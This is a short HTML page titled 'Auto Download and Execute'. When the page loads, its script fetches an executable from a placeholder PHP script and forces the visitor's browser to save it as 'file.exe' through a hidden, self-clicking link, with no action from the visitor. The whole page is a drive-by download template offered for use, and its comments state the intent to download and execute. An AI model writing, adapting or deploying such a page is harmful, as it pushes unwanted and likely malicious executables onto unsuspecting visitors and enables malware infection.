<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Auto Download and Execute</title>
</head>
<body>
<script>
// Set the PHP script URL
const phpScriptUrl = 'download_and_execute.php'; // Replace 'download_and_execute.php' with the actual URL of your PHP script

// Function to trigger download
function triggerDownloadAndExecute() {
    // Request the PHP script which serves the executable file
    fetch(phpScriptUrl)
    .then(response => response.blob())
    .then(blob => {
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.style.display = 'none';
        a.href = url;
        a.download = 'file.exe'; // Change the filename if necessary
        document.body.appendChild(a);
        a.click();
        window.URL.revokeObjectURL(url);
    })
    .catch(error => console.error('Error downloading and executing:', error));
}

// Trigger download and execution automatically when the page loads
window.onload = function() {
    triggerDownloadAndExecute();
};
</script>
</body>
</html>
